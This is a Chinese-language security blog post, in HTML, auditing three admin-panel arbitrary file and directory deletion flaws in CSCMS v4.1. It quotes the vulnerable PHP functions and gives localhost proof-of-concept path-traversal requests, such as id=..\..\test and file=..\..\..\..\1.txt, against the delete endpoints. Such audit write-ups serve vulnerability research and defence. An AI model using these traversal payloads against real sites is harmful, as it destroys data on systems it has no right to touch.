@@ -1,0 +1,810 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.2" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="h1tler's blog" type="application/atom+xml" />
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/images/favicon.ico?v=5.1.2" />
+
+
+
+
+
+
+<meta name="description" content="网上有漏洞的介绍，照猫画虎，尝试审计。任意文件删除漏洞，当对权限设置不当时危害很大。本次任意文件删除漏洞需要登录后台，条件有限制。 环境搭建：CSCMS ：http://www.chshcms.com/网站源码版本：Cscms_v4.1正式版（发布日期：2017-06-05）程序源码下载：https://github.com/chshcms/cscms 漏洞一：任意目录删除漏洞文件位置：\plug">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CSCMS_v4.1正式版任意文件删除漏洞">
+<meta property="og:url" content="http://www.cuittk.cn/2018/11/10/CSCMS_v4.1正式版任意文件删除漏洞/index.html">
+<meta property="og:site_name" content="h1tler&#39;s blog">
+<meta property="og:description" content="网上有漏洞的介绍，照猫画虎，尝试审计。任意文件删除漏洞，当对权限设置不当时危害很大。本次任意文件删除漏洞需要登录后台，条件有限制。 环境搭建：CSCMS ：http://www.chshcms.com/网站源码版本：Cscms_v4.1正式版（发布日期：2017-06-05）程序源码下载：https://github.com/chshcms/cscms 漏洞一：任意目录删除漏洞文件位置：\plug">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://img.cdn.cuittk.cn/dppqpmuvgtgo8jrq2ldb147odp.png">
+<meta property="og:image" content="http://img.cdn.cuittk.cn/j0vch05o7hp30ytjwr6ba8871r.png">
+<meta property="og:image" content="http://img.cdn.cuittk.cn/gyxqrx6v7rrg4f92ydnxgd7no2.png">
+<meta property="og:image" content="http://img.cdn.cuittk.cn/q2yxv1bstvdvxwbico9g08li60.png">
+<meta property="og:updated_time" content="2018-11-10T09:12:32.113Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="CSCMS_v4.1正式版任意文件删除漏洞">
+<meta name="twitter:description" content="网上有漏洞的介绍，照猫画虎，尝试审计。任意文件删除漏洞，当对权限设置不当时危害很大。本次任意文件删除漏洞需要登录后台，条件有限制。 环境搭建：CSCMS ：http://www.chshcms.com/网站源码版本：Cscms_v4.1正式版（发布日期：2017-06-05）程序源码下载：https://github.com/chshcms/cscms 漏洞一：任意目录删除漏洞文件位置：\plug">
+<meta name="twitter:image" content="http://img.cdn.cuittk.cn/dppqpmuvgtgo8jrq2ldb147odp.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.2',
+    sidebar: {"position":"left","display":"always","offset":12,"offset_float":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://www.cuittk.cn/2018/11/10/CSCMS_v4.1正式版任意文件删除漏洞/"/>
+
+
+
+
+
+  <title>CSCMS_v4.1正式版任意文件删除漏洞 | h1tler's blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">h1tler's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://www.cuittk.cn/2018/11/10/CSCMS_v4.1正式版任意文件删除漏洞/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="h1tler">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/2.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="h1tler's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">CSCMS_v4.1正式版任意文件删除漏洞</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-11-10T17:12:32+08:00">
+                2018-11-10
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/代码审计/" itemprop="url" rel="index">
+                    <span itemprop="name">代码审计</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i> 浏览
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>次
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>网上有漏洞的介绍，照猫画虎，尝试审计。<br>任意文件删除漏洞，当对权限设置不当时危害很大。<br><strong>本次任意文件删除漏洞需要登录后台，条件有限制。</strong></p>
+<h3 id="环境搭建："><a href="#环境搭建：" class="headerlink" title="环境搭建："></a>环境搭建：</h3><p>CSCMS ：<a href="http://www.chshcms.com/" target="_blank" rel="external">http://www.chshcms.com/</a><br>网站源码版本：Cscms_v4.1正式版（发布日期：2017-06-05）<br>程序源码下载：<a href="https://github.com/chshcms/cscms" target="_blank" rel="external">https://github.com/chshcms/cscms</a></p>
+<h3 id="漏洞一：任意目录删除"><a href="#漏洞一：任意目录删除" class="headerlink" title="漏洞一：任意目录删除"></a>漏洞一：任意目录删除</h3><h4 id="漏洞文件位置："><a href="#漏洞文件位置：" class="headerlink" title="漏洞文件位置："></a>漏洞文件位置：</h4><p>\plugins\sys\admin\Basedb.php 第160-177行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">public function del()&#123;</div><div class="line">		$dir = $this-&gt;input-&gt;get_post(&apos;id&apos;,true);</div><div class="line">		if(empty($dir))&#123;</div><div class="line">			getjson(L(&apos;plub_11&apos;));</div><div class="line">		&#125;</div><div class="line">		$dirs = array();</div><div class="line">		if(!is_array($dir))&#123;</div><div class="line">			$dirs[] = $dir;</div><div class="line">		&#125;else&#123;</div><div class="line">			$dirs = $dir;</div><div class="line">		&#125;</div><div class="line">		foreach($dirs as $dir) &#123;</div><div class="line">            deldir(FCPATH.&apos;attachment/backup/&apos;.$dir);</div><div class="line">		&#125;</div><div class="line">		$info[&apos;msg&apos;] = L(&apos;plub_12&apos;);</div><div class="line">		$info[&apos;url&apos;] = site_url(&apos;basedb/restore&apos;).&apos;?v=&apos;.rand(1000,9999);</div><div class="line">        getjson($info,0);</div><div class="line">	&#125;</div></pre></td></tr></table></figure></p>
+<h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$dir = $this-&gt;input-&gt;get_post(&apos;id&apos;,true);</div></pre></td></tr></table></figure>
+<p>POST传入参数id,<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">deldir(FCPATH.&apos;attachment/backup/&apos;.$dir);</div></pre></td></tr></table></figure></p>
+<p>FCPATH常量在index.php中定义为前端控制器的路径，也就是index.php所在的目录，此cms使用Codelgniter的php MVC框架。<br>deldir()函数在/cscms/app/helpers/common_helper.php的796-823行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">function deldir($dir,$sid=&apos;ok&apos;) &#123;</div><div class="line">	//先删除目录下的文件：</div><div class="line">	if(!is_dir($dir))&#123;</div><div class="line">	  return true;</div><div class="line">	&#125;</div><div class="line">	$dh=opendir($dir);</div><div class="line">	while ($file=readdir($dh)) &#123;</div><div class="line">		if($file!=&quot;.&quot; &amp;&amp; $file!=&quot;..&quot;) &#123;</div><div class="line">			$fullpath=$dir.&quot;/&quot;.$file;</div><div class="line">		 	if(!is_dir($fullpath)) &#123;</div><div class="line">		     	@unlink($fullpath);</div><div class="line">		 	&#125; else &#123;</div><div class="line">		     	deldir($fullpath);</div><div class="line">		 	&#125;</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">	closedir($dh);</div><div class="line">	//删除当前文件夹：</div><div class="line">	if($sid==&apos;ok&apos;)&#123;</div><div class="line">		if(@rmdir($dir)) &#123;</div><div class="line">		    return true;</div><div class="line">		&#125;else&#123;</div><div class="line">		    return false;</div><div class="line">		&#125;</div><div class="line">	&#125;else&#123;</div><div class="line">		return true;</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>本意应该是想删除\attachment\backup\下的某个目录，结果对$dir变量没有做任何限制，导致任意目录删除漏洞。</p>
+<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>在根目录创建test目录测试：<br><img src="http://img.cdn.cuittk.cn/dppqpmuvgtgo8jrq2ldb147odp.png" alt=""><br>构造参数<br>http\:\/\/localhost\/admin.php\/basedb\/del<br>POST: id=..\..\test<br><img src="http://img.cdn.cuittk.cn/j0vch05o7hp30ytjwr6ba8871r.png" alt=""></p>
+<h3 id="漏洞二：任意文件删除"><a href="#漏洞二：任意文件删除" class="headerlink" title="漏洞二：任意文件删除"></a>漏洞二：任意文件删除</h3><h4 id="漏洞文件位置"><a href="#漏洞文件位置" class="headerlink" title="漏洞文件位置:"></a>漏洞文件位置:</h4><p>/plugins/sys/admin/Skin.php 第422–445行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">public function del()&#123;</div><div class="line">       $ac = $this-&gt;input-&gt;get(&apos;ac&apos;,true);</div><div class="line">       $op = $this-&gt;input-&gt;get(&apos;op&apos;,true);</div><div class="line">       $dir = $this-&gt;input-&gt;get(&apos;dirs&apos;,true);</div><div class="line">       $file = $this-&gt;input-&gt;get(&apos;file&apos;);</div><div class="line">	if($ac!=&apos;mobile&apos;) $ac=&apos;pc&apos;;</div><div class="line">	if($op!=&apos;home&apos; &amp;&amp; $op!=&apos;user&apos;) $op=&apos;skins&apos;;</div><div class="line">	if(empty($dir)) getjson(L(&apos;plub_27&apos;));</div><div class="line"></div><div class="line">       $skin_dir = VIEWPATH.$ac.FGF.$op.FGF.$dir.FGF.$file;</div><div class="line">	if (!is_dir($skin_dir)) &#123;  //文件</div><div class="line">             $res=unlink($skin_dir);</div><div class="line">	&#125;else&#123;  //目录</div><div class="line">             $res=deldir($skin_dir);</div><div class="line">	&#125;</div><div class="line">	if($res)&#123;</div><div class="line">           $info[&apos;url&apos;] = site_url(&apos;skin&apos;).&apos;?ac=&apos;.$ac.&apos;&amp;op=&apos;.$op.&apos;&amp;v=&apos;.rand(1000,9999);</div><div class="line">           $info[&apos;msg&apos;] = L(&apos;plub_46&apos;);</div><div class="line">           $info[&apos;turn&apos;] = 1;</div><div class="line">           getjson($info,0);</div><div class="line">	&#125;else&#123;</div><div class="line">           getjson(L(&apos;plub_28&apos;));</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<h4 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$skin_dir = VIEWPATH.$ac.FGF.$op.FGF.$dir.FGF.$file;</div></pre></td></tr></table></figure>
+<p>VIEWPATH常量为视图的路径，为\tpl<br>POST传入参数ac给$ac，$ac变量要么为’mobile’，要么为’pc’，$op<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">if (!is_dir($skin_dir)) &#123;  //文件</div><div class="line">              $res=unlink($skin_dir);</div><div class="line">		&#125;else&#123;  //目录</div><div class="line">              $res=deldir($skin_dir);</div><div class="line">		&#125;</div></pre></td></tr></table></figure></p>
+<p>如果$skin_dir文件存在，则删除文件。<br>本意应该是删除<br>同样没有对$file变量做任何限制，导致任意文件删除。<br>发现第一个漏洞只能删除目录不能删除文件，第二个既可以删除目录也可以删除文件，都是使用同样的deldir()函数，很迷。</p>
+<h4 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>在网站根目录新建1.txt测试<br>构造payload\:http\://localhost/admin.php\/skin\/del?ac=pc&amp;op=skins&amp;dirs=default&amp;file=..\..\..\..\1.txt<br><img src="http://img.cdn.cuittk.cn/gyxqrx6v7rrg4f92ydnxgd7no2.png" alt=""></p>
+<h3 id="漏洞三：任意文件删除"><a href="#漏洞三：任意文件删除" class="headerlink" title="漏洞三：任意文件删除"></a>漏洞三：任意文件删除</h3><h4 id="漏洞文件位置-1"><a href="#漏洞文件位置-1" class="headerlink" title="漏洞文件位置"></a>漏洞文件位置</h4><p>/plugins/sys/admin/Plugins.php第285-299行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">public function del()&#123;</div><div class="line">    $dir = $this-&gt;input-&gt;get_post(&apos;dir&apos;,true);</div><div class="line">    if($dir==&apos;&apos;)&#123;</div><div class="line">    	getjson(L(&apos;plub_del_0&apos;),1);</div><div class="line">    &#125;</div><div class="line">       deldir(FCPATH.&apos;plugins&apos;.FGF.$dir.FGF);</div><div class="line">	//删除配置目录</div><div class="line">       deldir(CSCMS.$dir.FGF);</div><div class="line">	//删除模板目录</div><div class="line">       deldir(FCPATH.&apos;tpl/admin/&apos;.$dir.FGF);</div><div class="line">       $info[&apos;func&apos;] = __FUNCTION__;</div><div class="line">       $info[&apos;msg&apos;] = L(&apos;plub_del_1&apos;);</div><div class="line">       getjson($info,0);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<h4 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>同样对$dir参数未做任何限制。导致任意文件删除漏洞</p>
+<h4 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p><img src="http://img.cdn.cuittk.cn/q2yxv1bstvdvxwbico9g08li60.png" alt=""></p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>这些漏洞都需要能够登录网址后台，利用点有限制。属于后台漏洞。</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/11/10/apache总结/" rel="next" title="apache总结">
+                <i class="fa fa-chevron-left"></i> apache总结
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/11/10/CTF中的web总结/" rel="prev" title="CTF中的web总结">
+                CTF中的web总结 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+      <div id="vcomments"></div>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          
+            <img class="site-author-image" itemprop="image"
+              src="/images/2.gif"
+              alt="h1tler" />
+          
+            <p class="site-author-name" itemprop="name">h1tler</p>
+            <p class="site-description motion-element" itemprop="description">Youth is wholly experimental</p>
+        </div>
+
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+            
+              <a href="/archives/">
+            
+                <span class="site-state-item-count">54</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              <a href="/categories/index.html">
+                <span class="site-state-item-count">14</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/tags/index.html">
+                <span class="site-state-item-count">21</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+          <div class="feed-link motion-element">
+            <a href="/atom.xml" rel="alternate">
+              <i class="fa fa-rss"></i>
+              RSS
+            </a>
+          </div>
+        
+
+        <div class="links-of-author motion-element">
+          
+        </div>
+
+        
+        
+
+        
+        
+          <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+            <div class="links-of-blogroll-title">
+              <i class="fa  fa-fw fa-globe"></i>
+              Links
+            </div>
+            <ul class="links-of-blogroll-list">
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://sancrane.top/" title="sancrane" target="_blank">sancrane</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://myclass.azurewebsites.net/" title="OurClass" target="_blank">OurClass</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://ph0rse.me/" title="ph0rse" target="_blank">ph0rse</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://grassgrass.top/" title="grassgrass" target="_blank">grassgrass</a>
+                </li>
+              
+            </ul>
+          </div>
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#环境搭建："><span class="nav-number">1.</span> <span class="nav-text">环境搭建：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞一：任意目录删除"><span class="nav-number">2.</span> <span class="nav-text">漏洞一：任意目录删除</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#漏洞文件位置："><span class="nav-number">2.1.</span> <span class="nav-text">漏洞文件位置：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#漏洞分析"><span class="nav-number">2.2.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#漏洞利用"><span class="nav-number">2.3.</span> <span class="nav-text">漏洞利用</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞二：任意文件删除"><span class="nav-number">3.</span> <span class="nav-text">漏洞二：任意文件删除</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#漏洞文件位置"><span class="nav-number">3.1.</span> <span class="nav-text">漏洞文件位置:</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#漏洞分析-1"><span class="nav-number">3.2.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#漏洞利用-1"><span class="nav-number">3.3.</span> <span class="nav-text">漏洞利用</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞三：任意文件删除"><span class="nav-number">4.</span> <span class="nav-text">漏洞三：任意文件删除</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#漏洞文件位置-1"><span class="nav-number">4.1.</span> <span class="nav-text">漏洞文件位置</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#漏洞分析-2"><span class="nav-number">4.2.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#漏洞利用-2"><span class="nav-number">4.3.</span> <span class="nav-text">漏洞利用</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#总结"><span class="nav-number">5.</span> <span class="nav-text">总结</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">h1tler</span>
+
+  
+  
+  
+</div>
+
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i> 访问人数
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i> 访问总量
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      次
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+  <div style="display: none;">
+    <script src="//s95.cnzz.com/z_stat.php?id=1264590843&web_id=1264590843" language="JavaScript"></script>
+  </div>
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+  
+  <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.2"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.2"></script>
+
+
+
+  
+  
+
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.2"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.2"></script>
+
+
+  
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.2"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+  
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/valine@1.1.4/dist/Valine.min.js"></script>
+  <script type="text/javascript">
+    new Valine({
+        av: AV,
+        el: '#vcomments' ,
+        verify: false,
+        notify: false,
+        appId: 'MpjYiGHS1d0QlJPiqPcvHDY1-gzGzoHsz',
+        appKey: 'anlgXscWqVHMh6r0MiUOvmBN',
+        placeholder: '请在此输入您的留言'
+    });
+  </script>
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+	<!-- 页面点击小红心 -->
+	<script type="text/javascript" src="/js/src/love.js"></script>
+</body>
+</html>
